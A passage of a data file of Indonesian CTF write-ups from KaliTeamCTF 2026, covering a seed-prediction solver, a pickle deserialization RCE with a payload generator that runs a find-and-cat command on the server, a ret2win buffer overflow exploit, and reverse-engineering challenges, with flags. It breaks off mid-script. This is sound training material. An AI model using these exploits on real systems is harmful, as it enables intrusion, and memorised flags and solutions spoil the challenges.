        "content": "```python\n#!/usr/bin/env python3\n\nfrom pwn import *\nfrom ctypes import CDLL\nimport time\nimport os\nimport re\n\nHOST = \"chall.kali-team.online\"\nPORT = 10005\n\ncontext.log_level = \"error\"\n\n# Gunakan libc dari challenge\nif os.path.exists(\"./libc.so.6\"):\n    libc = CDLL(\"./libc.so.6\")\nelse:\n    libc = CDLL(\"libc.so.6\")\n\n\ndef predict_index(seed):\n    libc.srand(seed)\n    return libc.rand() % 100\n\n\ndef try_index(idx):\n    io = remote(HOST, PORT)\n    io.recvuntil(b\"enter Block number:\")\n    io.sendline(str(idx).encode())\n    out = io.recvall(timeout=2)\n    io.close()\n    return out.decode(errors=\"replace\")\n\n\n# Beberapa kemungkinan selisih waktu\noffsets = [0, -1, 1, -2, 2, -3, 3, -4, 4, -5, 5, -10, 10]\n\nfor _ in range(200):\n    now = int(time.time())\n    tried = set()\n\n    for off in offsets:\n        seed = now + off\n        idx = predict_index(seed)\n\n        if idx in tried:\n            continue\n        tried.add(idx)\n\n        print(f\"[try] seed={seed} idx={idx}\")\n\n        result = try_index(idx)\n        print(result)\n\n        m = re.search(r\"[A-Za-z0-9_]+\\{[^}]+\\}\", result)\n        if m:\n            print(\"\\n[+] FLAG FOUND:\")\n            print(m.group(0))\n            exit()\n\n    time.sleep(0.15)\n\nprint(\"[-] Flag not found. Try running the solver again.\")\n```\n\n---"
      },
      {
        "title": "Menjalankan Exploit",
        "content": "```bash\npython3 solve.py\n```\n\nContoh output:\n\n```text\n[try] seed=1754385000 idx=47\n\nReading block 47...\nDATA: KaliTeam{84c253e1-9aa5-4131-b119-2401e28815ee}\n\n[+] FLAG FOUND:\nKaliTeam{84c253e1-9aa5-4131-b119-2401e28815ee}\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\nfrom ctypes import CDLL\r\nimport time, os, re\r\n\r\nHOST = \"chall.kali-team.online\"\r\nPORT = 10071\r\n\r\ncontext.log_level = \"error\"\r\n\r\n# pakai libc challenge kalau ada di folder yang sama\r\nif os.path.exists(\"./libc.so.6\"):\r\n    libc = CDLL(\"./libc.so.6\")\r\nelse:\r\n    libc = CDLL(\"libc.so.6\")\r\n\r\ndef get_idx(seed):\r\n    libc.srand(seed)\r\n    return libc.rand() % 100\r\n\r\ndef try_block(idx):\r\n    io = remote(HOST, PORT)\r\n    io.recvuntil(b\"enter Block number:\")\r\n    io.sendline(str(idx).encode())\r\n    out = io.recvall(timeout=2)\r\n    io.close()\r\n    return out\r\n\r\n# urutan offset waktu: sekarang, -1, +1, dst\r\noffsets = [0, -1, 1, -2, 2, -3, 3, -4, 4, -5, 5, -10, 10]\r\n\r\nfor attempt in range(200):\r\n    now = int(time.time())\r\n\r\n    tried = set()\r\n\r\n    for off in offsets:\r\n        seed = now + off\r\n        idx = get_idx(seed)\r\n\r\n        if idx in tried:\r\n            continue\r\n        tried.add(idx)\r\n\r\n        out = try_block(idx)\r\n        text = out.decode(errors=\"replace\")\r\n\r\n        print(f\"[try] seed={seed} idx={idx}\")\r\n        print(text)\r\n\r\n        m = re.search(r\"[A-Za-z0-9_]+\\{[^}]+\\}\", text)\r\n        if m:\r\n            print(\"\\n[+] FLAG FOUND:\")\r\n            print(m.group(0))\r\n            exit()\r\n\r\n    time.sleep(0.15)\r\n\r\nprint(\"[-] flag belum ketemu, coba jalankan ulang solve.py\")"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{84c253e1-9aa5-4131-b119-2401e28815ee}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-pwn-theaethervault",
    "title": "Writeup CTF - The Aether Vault",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - The Aether Vault",
    "problemDescription": "Challenge menyediakan sebuah service berbasis menu yang memungkinkan pengguna melakukan otorisasi terhadap research log, mengekspor authorization hash, serta mengimpor authorization hash.\n\nSekilas fitur **Export Authorization Hash** tampak seperti menghasilkan hash kriptografis. Namun, petunjuk challenge mengarah pada fakta bahwa data tersebut sebenarnya merupakan **objek Python yang diserialisasi menggunakan pickle**, kemudian dibungkus dengan **Base64** dan **ROT13**.\n\nKarena service melakukan proses **`pickle.loads()`** terhadap data yang diimpor tanpa validasi, challenge ini dapat dieksploitasi menggunakan **Python Pickle Deserialization** untuk mengeksekusi perintah pada server dan memperoleh flag.\n\n---",
    "tools": [],
    "analysis": "Authorization hash ternyata bukan hash satu arah, melainkan hasil beberapa proses encoding yang bersifat reversible.\n\nUrutan prosesnya adalah:\n\n```text\nPython Object\n\n↓\n\npickle.dumps()\n\n↓\n\nBase64\n\n↓\n\nROT13\n```\n\nSehingga proses decode dilakukan sebagai berikut:\n\n```python\nimport base64\nimport codecs\nimport pickle\n\nenc = \"...\"\n\nb64 = codecs.decode(enc, \"rot_13\")\nraw = base64.b64decode(b64)\n\nobj = pickle.loads(raw)\n```\n\nKeberadaan `pickle.loads()` pada proses import menjadi titik utama kerentanan.\n\n---\n\nPython Pickle tidak dirancang untuk menerima data dari sumber yang tidak dipercaya.\n\nSaat `pickle.loads()` memproses objek tertentu, Python dapat memanggil method khusus seperti:\n\n```python\n__reduce__()\n```\n\nMethod tersebut dapat mengembalikan sebuah callable beserta argumennya sehingga fungsi tersebut akan dipanggil secara otomatis selama proses deserialisasi.\n\nDengan memanfaatkan perilaku ini, penyerang dapat membuat pickle yang mengeksekusi perintah sistem ketika di-import.\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** The Aether Vault\n- **Kategori:** Misc\n\n---"
      },
      {
        "title": "Petunjuk Challenge",
        "content": "Hint yang diberikan:\n\n```text\nProject C1 was always a bit... sour.\nI heard the lead scientist likes to keep his data\npreserved in a base solution,\nrotated 13 times for \"security\".\n```\n\nMakna dari petunjuk tersebut adalah:\n\n```text\npreserved      → Pickle\n\nbase solution  → Base64\n\nrotated 13     → ROT13\n\nProject C1     → Petunjuk tambahan menuju log \"Pickled\"\n```\n\nDengan demikian format authorization hash dapat disimpulkan sebagai:\n\n```text\nROT13(Base64(Pickle_Object))\n```\n\n---"
      },
      {
        "title": "Interaksi Awal",
        "content": "Menu service:\n\n```text\n=== Aether Research Vault v4.0.7 ===\n\n1. Authorize log access\n2. View authorized logs\n3. Export authorization hash\n4. Import authorization hash\n```\n\nKetika belum ada log yang diotorisasi, menu export menghasilkan:\n\n```text\nExport Hash (Encrypted):\n\ntNEqyP4=\n```\n\nSetelah mengotorisasi salah satu log, token berubah menjadi string yang jauh lebih panjang.\n\nSebagai contoh:\n\n```text\n1\n5\n```\n\nOutput:\n\n```text\nAccess authorized.\n```\n\nKemudian:\n\n```text\n2\n```\n\nMenghasilkan:\n\n```text\n----------------------------------------\nAuthorized Research Logs:\n\n5. Project-C1:\nThe Preservation Protocol (Pickled)\n\n----------------------------------------\n```\n\nJudul log tersebut semakin menguatkan bahwa challenge berkaitan dengan **Python Pickle**.\n\n---"
      },
      {
        "title": "Penyusunan Payload",
        "content": "Payload dibuat menggunakan sebuah objek dengan implementasi `__reduce__()`.\n\n```python\nimport os\n\nclass RCE:\n    def __reduce__(self):\n        cmd = (\n            \"find / -maxdepth 3 \"\n            \"-type f -iname '*flag*' \"\n            \"-exec cat {} \\\\; 2>/dev/null\"\n        )\n\n        return (os.popen, (cmd,))\n```\n\nObjek tersebut kemudian:\n\n1. Diserialisasi menggunakan `pickle.dumps()`\n2. Di-encode menggunakan Base64\n3. Ditransformasi menggunakan ROT13\n\nSehingga menghasilkan authorization hash yang valid.\n\n---"
      },
      {
        "title": "Payload yang Berhasil",
        "content": "Token yang berhasil digunakan:\n\n```text\ntNFIutNNNNNNNNPZPTW1nJk0nJ5myVjRMKMuoWFGyVkdJ19snJ1jo3W0K18bVz9mVvxhpT9jMJ4bVzMcozDtYlNgoJS4MTIjqTttZlNgqUyjMFOzVP1cozSgMFNaXzMfLJpdWlNgMKuyLlOwLKDtr30tKSj7VQV+Y2Eyqv9hqJkfVvxhpzIuMPtcKMFSySXHYt==\n```\n\nLangkah eksploitasi:\n\n```text\n4\n```\n\nMasukkan payload di atas.\n\nKemudian pilih:\n\n```text\n2\n```\n\nOutput:\n\n```text\nImport successful.\n\n----------------------------------------\nAuthorized Research Logs:\n\nKaliTeam{p1ckl3_4nd_r0t13_4r3_n0t_s4f3_4nym0r3}\n\n----------------------------------------\n```\n\n---"
      },
      {
        "title": "Generator Payload",
        "content": "Script berikut dapat digunakan untuk menghasilkan payload serupa.\n\n```python\n#!/usr/bin/env python3\n\nimport base64\nimport codecs\nimport pickle\nimport os\n\nclass RCE:\n    def __reduce__(self):\n        cmd = (\n            \"find / -maxdepth 3 \"\n            \"-type f -iname '*flag*' \"\n            \"-exec cat {} \\\\; 2>/dev/null\"\n        )\n\n        return (os.popen, (cmd,))\n\n\ndef main():\n    raw = pickle.dumps(RCE())\n\n    b64 = base64.b64encode(raw).decode()\n\n    token = codecs.encode(\n        b64,\n        \"rot_13\"\n    )\n\n    print(token)\n\n\nif __name__ == \"__main__\":\n    main()\n```\n\nToken yang dihasilkan kemudian diimpor melalui menu:\n\n```text\n4. Import authorization hash\n```\n\nSetelah import berhasil, pilih:\n\n```text\n2. View authorized logs\n```\n\nuntuk memperoleh flag.\n\n---"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{p1ckl3_4nd_r0t13_4r3_n0t_s4f3_4nym0r3}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-pwn-warmy",
    "title": "Writeup CTF - Warmy",
    "category": "Pwn",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - Warmy",
    "problemDescription": "",
    "tools": [],
    "analysis": "Lakukan pengecekan menggunakan `checksec`:\n\n```bash\nchecksec --file=warmy\n```\n\nHasil:\n\n```text\nArch:       amd64-64-little\nRELRO:      Partial RELRO\nStack:      No canary found\nNX:         NX enabled\nPIE:        No PIE (0x400000)\nSHSTK:      Enabled\nIBT:        Enabled\nStripped:   No\n```\n\nBeberapa poin penting dari hasil tersebut:\n\n- **No Canary** → Stack buffer overflow dapat dilakukan tanpa perlu membocorkan nilai canary.\n- **NX Enabled** → Shellcode pada stack tidak dapat dieksekusi.\n- **No PIE** → Seluruh alamat fungsi pada binary bersifat tetap.\n- **Stripped: No** → Simbol fungsi masih tersedia sehingga fungsi seperti `win()` dapat ditemukan dengan mudah.\n\nDari karakteristik tersebut dapat disimpulkan bahwa challenge ini merupakan tipe **ret2win**.\n\n---\n\nFungsi `vuln()` memiliki buffer lokal berukuran **0x40 byte**.\n\n```asm\nsub rsp, 0x40\n```\n\nInput dibaca menggunakan fungsi berbahaya `gets()`.\n\n```asm\nlea rax, [buffer]\ncall sym.imp.gets\n```\n\nKarena `gets()` tidak membatasi panjang input, pengguna dapat menulis melewati batas buffer hingga menimpa **saved RIP**.\n\nLayout stack:\n\n```text\nbuffer      : 0x40 byte\nsaved RBP   : 8 byte\nsaved RIP   : 8 byte\n```\n\nSehingga offset menuju return address adalah:\n\n```text\n0x40 + 8 = 72 byte\n```\n\nPayload yang dibutuhkan:\n\n```text\n'A' * 72 + p64(win)\n```\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** Warmy\n- **Kategori:** Pwn\n- **Deskripsi:**\n\n> Its Simple\n\n- **Remote**\n\n```text\nnc chall.kali-team.online 10023\n```\n\n---"
      },
      {
        "title": "File Challenge",
        "content": "Challenge menyediakan beberapa file:\n\n```text\nflag.txt\nld-linux-x86-64.so.2\nlibc.so.6\nwarmy\n```\n\n---"
      },
      {
        "title": "Reverse Engineering",
        "content": "Binary dianalisis menggunakan **radare2**.\n\n```bash\nr2 -A warmy\n```\n\nDaftar fungsi:\n\n```bash\nafl\n```\n\nFungsi yang menarik:\n\n```text\n0x00401236    sym.win\n0x004012ce    sym.vuln\n0x004012fd    main\n```\n\nFungsi `main()` hanya melakukan inisialisasi buffering kemudian memanggil `vuln()`.\n\n```c\ncall sym.vuln\n```\n\n---"
      },
      {
        "title": "Fungsi `win()`",
        "content": "Fungsi `win()` membuka file `flag.txt` kemudian mencetak seluruh isinya.\n\nPotongan disassembly:\n\n```asm\nlea rax, str.flag.txt\ncall sym.imp.fopen\n\nlea rax, str._nThe_Flag:\ncall sym.imp.printf\n\ncall sym.imp.fgetc\ncall sym.imp.putchar\n```\n\nAlamat fungsi:\n\n```text\nwin = 0x401236\n```\n\n---"
      },
      {
        "title": "Strategi Eksploitasi",
        "content": "Karena binary **No PIE**, alamat fungsi `win()` selalu tetap.\n\nEksploitasi cukup dilakukan dengan:\n\n1. Mengisi buffer sebanyak 72 byte.\n2. Menimpa return address dengan alamat `win()`.\n3. Saat fungsi `vuln()` selesai, eksekusi langsung berpindah ke `win()`, yang kemudian mencetak isi `flag.txt`.\n\n---"
      },
      {
        "title": "Solver",
        "content": "```python\n#!/usr/bin/env python3\n\nfrom pwn import *\n\nHOST = \"chall.kali-team.online\"\nPORT = 10023\n\ncontext.binary = elf = ELF(\"./warmy\", checksec=False)\ncontext.log_level = \"info\"\n\noffset = 72\nwin = elf.symbols[\"win\"]\n\npayload = b\"A\" * offset\npayload += p64(win)\n\nio = remote(HOST, PORT)\nio.recvuntil(b\"Hola!\")\nio.sendline(payload)\nio.interactive()\n```\n\n---"
      },
      {
        "title": "Alternatif (Stack Alignment)",
        "content": "Apabila terjadi masalah alignment pada beberapa sistem, tambahkan gadget `ret` sebelum memanggil `win()`.\n\n```python\n#!/usr/bin/env python3\n\nfrom pwn import *\n\nHOST = \"chall.kali-team.online\"\nPORT = 10023\n\nelf = ELF(\"./warmy\", checksec=False)\n\noffset = 72\nret = ROP(elf).find_gadget([\"ret\"])[0]\nwin = elf.symbols[\"win\"]\n\npayload = b\"A\" * offset\npayload += p64(ret)\npayload += p64(win)\n\nio = remote(HOST, PORT)\nio.recvuntil(b\"Hola!\")\nio.sendline(payload)\nio.interactive()\n```\n\n---"
      },
      {
        "title": "Menjalankan Exploit",
        "content": "```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\nThe Flag: KaliTeam{19927c9c-49dc-4d4c-9eed-45d3a95bdb90}\n```\n\n---"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pwn import *\r\n\r\nHOST = \"chall.kali-team.online\"\r\nPORT = 10023\r\n\r\ncontext.binary = elf = ELF(\"./warmy\", checksec=False)\r\ncontext.log_level = \"info\"\r\n\r\noffset = 72\r\nwin = elf.symbols[\"win\"]\r\n\r\npayload = b\"A\" * offset\r\npayload += p64(win)\r\n\r\nio = remote(HOST, PORT)\r\nio.recvuntil(b\"Hola!\")\r\nio.sendline(payload)\r\nio.interactive()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{19927c9c-49dc-4d4c-9eed-45d3a95bdb90}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-rev-faultcrypto",
    "title": "Fault Cartography",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Fault Cartography",
    "problemDescription": "Flag ada di balik kombinasi file ELF `faultline` dan data `faultline.map`. Binary membaca map, membangun rute 16x16, lalu sengaja memicu fault (`SIGILL`, `SIGFPE`, `SIGSEGV`) sesuai record di map. Signal handler memutasi 6 blok `uint64` dari input. Setelah semua langkah selesai, hasil mutasi dibandingkan dengan target yang didekripsi dari map.",
    "tools": [],
    "analysis": "`strings -a ./faultline` menunjukkan nama file `faultline.map`, pesan gagal `lost`, dan pesan sukses `the map remembers you`.\n\nHeader map:\n\n```text\nmagic     = FLT2\nversion   = 2\nsteps     = 104\ninput_len = 42\nout_len   = 48\nseed      = 0xf017ca4706a11e5d\n```\n\nBinary membaca 78 byte header, lalu 256 record berukuran 24 byte.\n\nFungsi utama berada mulai sekitar `0x1280`. Bagian pentingnya:\n\n- `0x12b4`: membuka `faultline.map`.\n- `0x132c` sampai `0x13bc`: validasi magic, versi, panjang output, dan digest header.\n- `0x145d` sampai `0x14ff`: input 42 byte disalin ke buffer 48 byte dan di-XOR per blok dengan output `mix64(seed ^ i*GOLD ^ INIT_XOR)`.\n- `0x17e5` sampai `0x18a3`: dekripsi record map.\n- `0x194d`: memicu fault berdasarkan `record[0]`.\n- `0x1ae0`: signal handler yang memutasi 6 blok input.\n- `0x16b0` sampai `0x1702`: dekripsi target akhir.\n- `0x1729` sampai `0x177f`: membandingkan target dengan buffer hasil mutasi.\n\nInput salah seperti string kosong, `AAAA`, atau `KCTF{test}` menghasilkan:\n\n```text\nlost\n```\n\nSetelah solver final dijalankan, binary menerima flag dan mencetak:\n\n```text\nthe map remembers you\n```\n\nGDB juga dipakai untuk memastikan detail handler. GDB perlu meneruskan `SIGILL`, `SIGFPE`, dan `SIGSEGV` ke program karena fault tersebut memang bagian dari validasi.",
    "solution": [
      {
        "title": "File Challenge",
        "content": "- `faultline`: ELF 64-bit PIE, stripped, dynamically linked.\n- `faultline.map`: data binary dengan magic `FLT2`.\n- `solve_faultline.py`: solver final untuk membalik validasi."
      },
      {
        "title": "Algoritma Validasi atau Encoding",
        "content": "Record map didekripsi dengan:\n\n```text\nrecord_block[i] = encrypted_block[i] ^ mix64(seed ^ i*REC_STEP ^ pos*REC_POS_MUL ^ REC_XOR)\n```\n\nRute awal:\n\n```text\nx = ((seed >> 8) & 0xf) ^ sx_mask\ny = ((seed >> 20) & 0xf) ^ sy_mask\nkey = mix64(seed ^ BASE_XOR)\n```\n\nArah gerak dari `.rodata`:\n\n```text\ndx = [0, 1, 0, -1]\ndy = [-1, 0, 1, 0]\n```\n\nSetiap langkah memperbarui key:\n\n```text\nkey = mix64(key ^ record_tail ^ y ^ (x << 8) ^ step*GOLD)\n```\n\nSignal handler memakai `record[0]` sebagai tipe fault dan `record[1]` sebagai subtype. Mutasi terjadi pada 6 blok `uint64`: add, xor, swap, rotate, permutation, dan perkalian modular dengan konstanta ganjil. Karena operasi ini invertible, solver mendekripsi target akhir lalu membalik semua fault dari langkah terakhir ke langkah pertama."
      },
      {
        "title": "Penyusunan Solve Script",
        "content": "`solve_faultline.py` melakukan:\n\n1. Parse header dan record dari `faultline.map`.\n2. Dekripsi semua record yang dilewati rute.\n3. Hitung `final_key`.\n4. Dekripsi target akhir.\n5. Invert mutasi signal handler secara terbalik.\n6. Undo transform awal input.\n7. Jalankan `./faultline` dengan flag hasil recovery untuk validasi."
      },
      {
        "title": "Cara Menjalankan",
        "content": "```bash\npython3 ./solve_faultline.py\n```\n\nOutput:\n\n```text\nKaliTeam{faults_draw_the_only_honest_path}\nthe map remembers you\n```"
      },
      {
        "title": "Catatan",
        "content": "Kesalahan yang mudah terjadi ada di dua titik. Dekripsi record memakai `seed`, bukan `current_key`. Selain itu tabel arah bukan urutan kiri/bawah/kanan/atas, tapi `dx=[0,1,0,-1]` dan `dy=[-1,0,1,0]`."
      }
    ],
    "terminalOutputs": [],
    "flag": "KaliTeam{faults_draw_the_only_honest_path}",
    "lessonsLearned": ""
  },
  {
    "id": "kaliteamctf2026-rev-whisperingfeather",
    "title": "Writeup CTF - Whispering Feather",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "KaliTeamCTF 2026",
    "tags": [],
    "description": "Writeup for challenge Writeup CTF - Whispering Feather",
    "problemDescription": "Challenge ini menyediakan sebuah binary **ELF ARM64 (AArch64)** yang bersifat **static** dan **stripped**. Meskipun hasil `strings` menampilkan beberapa string yang menyerupai flag, seluruh string tersebut hanyalah **decoy**.\n\nBinary memvalidasi sebuah **composite response** sepanjang **51 karakter**. Apabila input sesuai, program akan melewati beberapa tahap validasi berbasis **MD5**, memilih salah satu handler terenkripsi di dalam `.rodata`, mendekripsinya, kemudian mengeksekusi payload tersebut. Payload hasil dekripsi berisi kode ARM64 yang mencetak flag asli.\n\nComposite response yang valid adalah:\n\n```text\nwing-CSBWUGKJGUHGSGJ4F5XB:037413d7:7b456423ebd50c2f\n```\n\n---",
    "tools": [],
    "analysis": "Menjalankan `strings` pada binary menghasilkan beberapa string menarik:\n\n```text\n== WHISPERING FEATHER ==\n\nPresent the three seals:\n\n[+] seals aligned; selecting a handler...\n[-] The keeper rejects this composite response.\n\nKaliTeam{str1ngs_lie_to_you}\nKaliTeam{n0t_th3_b1rd_y0u_w4nt}\n\nthree seals; one feather; no plaintext song\n```\n\nSekilas tampak terdapat dua flag, namun README challenge secara eksplisit mengisyaratkan bahwa seluruh string berbentuk flag yang terlihat hanyalah **umpan (decoy)**.\n\nArtinya flag asli baru muncul setelah payload terenkripsi berhasil dijalankan.\n\n---\n\nEntry point binary berada pada section `.text` dan menggunakan syscall secara langsung tanpa memanfaatkan libc.\n\nAlur program secara umum adalah:\n\n1. Menampilkan banner dan prompt.\n2. Membaca input pengguna.\n3. Menghapus karakter newline (`LF`/`CRLF`).\n4. Membentuk **composite response** internal.\n5. Membandingkan input dengan composite response tersebut.\n6. Melakukan beberapa tahap validasi berbasis MD5.\n7. Memilih salah satu handler terenkripsi pada `.rodata`.\n8. Mendekripsi handler.\n9. Mengeksekusi hasil dekripsi menggunakan `blr`.\n\nPotongan alur:\n\n```text\nread()\n↓\n\ncek panjang input == 0x33\n\n↓\n\nbandingkan dengan composite internal\n\n↓\n\nMD5 gate\n\n↓\n\ndecrypt handler\n\n↓\n\nblr x0\n```\n\nPanjang input divalidasi menggunakan nilai:\n\n```text\n0x33 = 51 byte\n```\n\n---\n\nBinary tidak dijalankan secara langsung karena target analisis menggunakan arsitektur **ARM64/AArch64**.\n\nSeluruh perilaku program berhasil dipahami melalui static analysis dan reproduksi algoritma menggunakan Python.\n\nDari hasil disassembly diperoleh alur berikut:\n\n```text\nread(0, input, 0x9f)\n\n↓\n\ncek panjang == 51\n\n↓\n\nbandingkan dengan composite response\n\n↓\n\njika gagal:\n    \"The keeper rejects...\"\n\n↓\n\njika sukses:\n    mmap(RWX)\n    decrypt payload\n    blr payload\n```\n\n---",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- **Judul:** Whispering Feather\n- **Kategori:** Reverse Engineering\n\n---"
      },
      {
        "title": "File Challenge",
        "content": "Challenge menyediakan dua file:\n\n```text\nREADME.txt\nwhispering_feather\n```\n\nIdentifikasi awal:\n\n```text\nREADME.txt         : ASCII text\nwhispering_feather : ELF 64-bit LSB executable, ARM aarch64,\n                     statically linked, stripped\n```\n\n---"
      },
      {
        "title": "Algoritma Validasi",
        "content": "Composite response terdiri dari tiga bagian atau **seal**."
      },
      {
        "title": "Seal Pertama",
        "content": "Seal pertama dibentuk oleh sebuah virtual machine kecil yang menggunakan sekitar **0x60 byte opcode** dari `.rodata`.\n\nVM tersebut memanfaatkan empat buah state 64-bit dengan operasi seperti:\n\n- XOR\n- Rotate\n- Multiply\n- Addition\n- Swap\n\nOutput VM kemudian dikonversi menjadi 20 karakter menggunakan alfabet:\n\n```text\nABCDEFGHJKLMNPQRSTUVWXYZ23456789\n```\n\nHasil akhirnya:\n\n```text\nwing-CSBWUGKJGUHGSGJ4F5XB\n```\n\n---"
      },
      {
        "title": "Seal Kedua",
        "content": "Seal kedua merupakan hash custom 32-bit terhadap seal pertama.\n\nHasilnya:\n\n```text\n037413d7\n```\n\n---"
      },
      {
        "title": "Seal Ketiga",
        "content": "Seal ketiga merupakan hash custom 64-bit terhadap gabungan:\n\n```text\nwing-CSBWUGKJGUHGSGJ4F5XB:037413d7\n```\n\nHasilnya:\n\n```text\n7b456423ebd50c2f\n```\n\n---"
      },
      {
        "title": "Composite Response",
        "content": "Ketiga seal digabungkan menjadi satu string:\n\n```text\nwing-CSBWUGKJGUHGSGJ4F5XB:037413d7:7b456423ebd50c2f\n```\n\nApabila input sama persis dengan composite response tersebut, binary melanjutkan ke tahap validasi berikutnya.\n\n---"
      },
      {
        "title": "Validasi MD5",
        "content": "Program menghitung tiga nilai MD5:\n\n```text\nMD5(composite)\n\nMD5(composite + q4_seed)\n\nMD5(key_material)\n```\n\nHash tersebut dibandingkan dengan nilai target yang dibangun dari beberapa konstanta di `.rodata`.\n\nJika seluruh validasi berhasil, handler dihitung menggunakan rumus:\n\n```text\nhandler =\n(hash32(composite) ^\n(q4[13] ^ md5_2[5] ^ md5_1[9])) & 3\n```\n\nUntuk composite response yang benar diperoleh:\n\n```text\nhandler = 2\n```\n\n---"
      },
      {
        "title": "Dekripsi Payload",
        "content": "Handler ke-2 menunjuk ke blok terenkripsi berukuran:\n\n```text\n0x400 byte\n```\n\nDekripsi dilakukan menggunakan:\n\n- ciphertext\n- counter\n- MD5(composite)\n- MD5(composite + q4_seed)\n- seed `q4`\n\nSetelah proses dekripsi selesai, payload diawali dengan instruksi ARM64 yang valid:\n\n```asm\nstp x29, x30, [sp, #-0x10]!\nmov x29, sp\nadr x1, flag_string\nmov x0, #1\nmov x2, #0x25\nmov x8, #0x40\nsvc #0\nret\n```\n\nPayload tersebut melakukan syscall `write()` untuk mencetak flag asli.\n\n---"
      },
      {
        "title": "Penyusunan Solver",
        "content": "Solver dibuat untuk mereproduksi seluruh algoritma validasi tanpa melakukan brute force.\n\nLangkah yang dilakukan:\n\n1. Membaca binary `whispering_feather`.\n2. Mereproduksi virtual machine pembentuk seal pertama.\n3. Menghitung seal kedua dan ketiga.\n4. Memvalidasi seluruh MD5 gate.\n5. Menghitung indeks handler.\n6. Mendekripsi payload yang dipilih.\n7. Mengekstrak string flag dari payload hasil dekripsi.\n\nPendekatan ini memperoleh flag secara langsung dari payload yang dieksekusi, bukan dari string umpan yang terdapat pada binary utama.\n\n---"
      },
      {
        "title": "Menjalankan Solver",
        "content": "```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\nComposite response:\nwing-CSBWUGKJGUHGSGJ4F5XB:037413d7:7b456423ebd50c2f\n\nKaliTeam{p0lyg1ot_b3h1nd_th3_m1rr0r}\n```\n\n---"
      },
      {
        "title": "Kesimpulan",
        "content": "Challenge ini menggabungkan beberapa teknik reverse engineering dalam satu binary ARM64, mulai dari virtual machine sederhana, hash kustom, validasi bertingkat menggunakan MD5, hingga dekripsi payload yang dieksekusi secara dinamis.\n\nString berbentuk flag yang muncul melalui `strings` hanyalah decoy sehingga analisis tidak dapat berhenti pada tahap tersebut. Dengan mereproduksi algoritma pembentukan **three seals**, melewati seluruh proses validasi, dan mendekripsi handler yang dipilih, payload sebenarnya berhasil diperoleh dan dijalankan untuk menampilkan flag asli."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport hashlib\r\nimport re\r\nimport struct\r\n\r\nMASK32 = 0xffffffff\r\nMASK64 = 0xffffffffffffffff\r\nBASE_VADDR = 0x400000\r\nBASE_OFF = 0x10000\r\n\r\n\r\ndef file_off(vaddr: int) -> int:\r\n    return vaddr - BASE_VADDR + BASE_OFF\r\n\r\n\r\ndef u32(x: int) -> int:\r\n    return x & MASK32\r\n\r\n\r\ndef u64(x: int) -> int:\r\n    return x & MASK64\r\n\r\n\r\ndef ror(x: int, n: int, bits: int) -> int:\r\n    mask = (1 << bits) - 1\r\n    n &= bits - 1\r\n    x &= mask\r\n    return ((x >> n) | (x << (bits - n))) & mask\r\n\r\n\r\ndef ror8(x: int, n: int) -> int:\r\n    return ror(x, n, 8)\r\n\r\n\r\ndef ld32(buf: bytearray, off: int) -> int:\r\n    return struct.unpack_from('<I', buf, off)[0]\r\n\r\n\r\ndef ld64(buf: bytearray, off: int) -> int:\r\n    return struct.unpack_from('<Q', buf, off)[0]\r\n\r\n\r\ndef st64(buf: bytearray, off: int, val: int) -> None:\r\n    struct.pack_into('<Q', buf, off, val & MASK64)\r\n\r\n\r\ndef run_seal_vm(blob: bytes) -> tuple[bytearray, bytes]:\r\n    \"\"\"Reproduce the small custom VM that creates the first 20-char seal.\"\"\"\r\n    mem = bytearray(0x400)\r\n\r\n    # q4 seed and 0x60-byte VM program from .rodata.\r\n    mem[0x280:0x290] = blob[file_off(0x400d90):file_off(0x400d90) + 16]\r\n    mem[0x2b0:0x310] = blob[file_off(0x400da0):file_off(0x400da0) + 0x60]\r\n\r\n    w9 = ld32(mem, 0x281)\r\n    x12 = 0xbb67ae8584caa73b\r\n    x8 = 0x9cd7c967f3bcc924 ^ ((w9 << 8) & MASK64)\r\n    x9 = ld64(mem, 0x288)\r\n    st64(mem, 0x310, x8)\r\n    st64(mem, 0x318, x9 ^ x12)\r\n    st64(mem, 0x320, 0x3c6ef372fe94f806)\r\n\r\n    x6 = 0xa54ff53a5f1d36f1 ^ (x9 >> 56)\r\n    mul_const = 0xd6e8feb86659fd93\r\n    add_const = 0x9e3779b97f4a7c15\r\n    c2 = 0xff51afd7ed558ccd\r\n    c3 = 0xa24baed4963ee407\r\n    x17 = 0x0101010101010101\r\n    x18 = 0x00000100000001b3\r\n    alphabet = blob[file_off(0x400e88):file_off(0x400e88) + 32]\r\n\r\n    # The generated response begins with literal \"wing-\".\r\n    mem[0x294:0x298] = blob[file_off(0x400e10):file_off(0x400e10) + 4]\r\n    mem[0x298] = ord('-')\r\n\r\n    for idx in range(20):\r\n        x6 = u64(x6 + add_const)\r\n        x6 = u64(idx * 0x27 + x6)\r\n        